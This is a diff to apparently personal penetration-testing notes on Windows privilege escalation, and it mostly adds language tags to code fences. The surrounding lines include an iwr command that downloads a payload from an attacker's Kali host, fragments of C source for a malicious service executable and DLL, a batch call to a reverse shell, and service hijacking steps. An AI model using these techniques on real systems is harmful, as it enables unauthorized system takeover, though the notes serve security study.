@@ -161,7 +161,7 @@ C:\Program Files\Windows PowerShell\*
 		- `python3 -m http.server`
 		- `iwr -uri http://{kali_IP}:8000/newuser.exe -Outfile newuser.exe`
 		
-```
+```C
 #include <stdlib.h>
 int main ()
 {
@@ -174,6 +174,7 @@ int main ()
   return 0;
 }
 ```
+
 - Then, move the normal executable out from it's usual location, move ours in, and then figure out how to restart the service (so it uses the exe)
 - Restarting the service
 	- Could be as simple as `net stop {service}`, but access will likely be denied
@@ -194,7 +195,7 @@ int main ()
 	- MinGW can compile C++ code into DLLs with the `--shared` flag
 		- `x86_64-w64-mingw32-gcc dll.cpp --shared -o dll.dll`
 
-```
+```C
 #include <stdlib.h>
 #include <windows.h>
 
@@ -223,11 +224,7 @@ LPVOID lpReserved ) // Reserved
 ```
 
 **.bat files**
-- Just call an executable inside the batch file
-
-```
-C:\Users\Public\reverseshell.exe
-```
+- Just call an executable inside the batch file: `C:\Users\Public\reverseshell.exe`
 
 **Abusing Service ACLs**
 - If we have full control over a service, we can use `sc` to modify the service
